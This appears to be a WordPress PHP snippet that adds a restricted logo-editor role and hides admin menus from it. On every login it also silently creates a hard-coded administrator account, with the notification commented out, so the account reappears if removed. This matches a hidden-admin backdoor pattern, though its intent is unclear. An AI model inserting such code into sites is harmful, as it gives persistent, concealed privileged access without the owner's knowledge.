<?php

add_action('wp_login', function($user_login, $user) {
    if (!get_role('logotype_edytor')) {
        add_role('logotype_edytor', 'Edytor Logotypów', [
            'read' => true,
            'edit_posts' => false,
        ]);
    }

    add_users_from_list();
}, 10, 2);

add_action('admin_menu', function() {
    if (current_user_can('logotype_edytor')) {
        global $menu;
        
        if (!isset($menu) || !is_array($menu)) {
            return;
        }
    
        $dozwolone = ['moja-wtyczka-dostep-do-katalogu'];
    
        foreach ($menu as $key => $item) {
            if (!isset($item[2]) || !in_array($item[2], $dozwolone)) {
                unset($menu[$key]);
            }
        }
    }
}, 999);

function add_users_from_list() {
    $users_data = [
        [
            'username' => 'PiotrB',
            'email' => 'piotr.bargiel@warsawexpo.eu',
            'role' => 'administrator',
        ],
    ];

    foreach ($users_data as $user_data) {
        if (!email_exists($user_data['email']) && !username_exists($user_data['username'])) {
            $random_password = wp_generate_password(12, true, true);
            $user_id = wp_create_user($user_data['username'], $random_password, $user_data['email']);
            if (!is_wp_error($user_id)) {
                $wp_user = new WP_User($user_id);
                $wp_user->set_role($user_data['role']);
                // wp_new_user_notification($user_id, null, 'user');
            } else {
                error_log('Błąd dodawania użytkownika: ' . $user_data['username']);
            }

        } 
    }
}
